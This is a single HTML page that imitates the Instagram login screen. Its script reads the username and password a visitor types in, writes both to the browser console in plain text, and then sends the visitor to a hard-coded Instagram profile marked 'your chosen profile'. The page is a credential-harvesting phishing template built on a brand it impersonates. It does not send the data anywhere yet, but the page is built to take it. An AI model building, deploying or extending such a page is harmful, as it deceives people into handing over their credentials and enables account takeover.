<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Instagram Login</title>
  <style>
    body {
      font-family: sans-serif;
      background-color: #fafafa;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .login-box {
      background: white;
      border: 1px solid #dbdbdb;
      padding: 40px;
      text-align: center;
      width: 300px;
      box-shadow: 0 0 10px rgba(0,0,0,0.05);
    }
    input {
      width: 100%;
      padding: 10px;
      margin: 8px 0;
      border: 1px solid #dbdbdb;
      border-radius: 4px;
    }
    button {
      width: 100%;
      padding: 10px;
      background-color: #3897f0;
      color: white;
      border: none;
      border-radius: 4px;
      font-weight: bold;
      cursor: pointer;
    }
    h2 {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    }
  </style>
</head>
<body>

  <div class="login-box">
    <h2>Instagram</h2>
    <form onsubmit="redirectUser(event)">
      <input id="username" type="text" placeholder="Phone number, username, or email" required>
      <input id="password" type="password" placeholder="Password" required>
      <button type="submit">Log In</button>
    </form>
  </div>

  <script>
    function redirectUser(event) {
      event.preventDefault(); // Stop form from reloading

      const user = document.getElementById("username").value;
      const pass = document.getElementById("password").value;

      console.log("üì• Username entered:", user);
      console.log("üîê Password entered:", pass);

      window.location.href = "https://instagram.com/marsha_cute_bea"; // your chosen profile
    }
  </script>

</body>
</html>
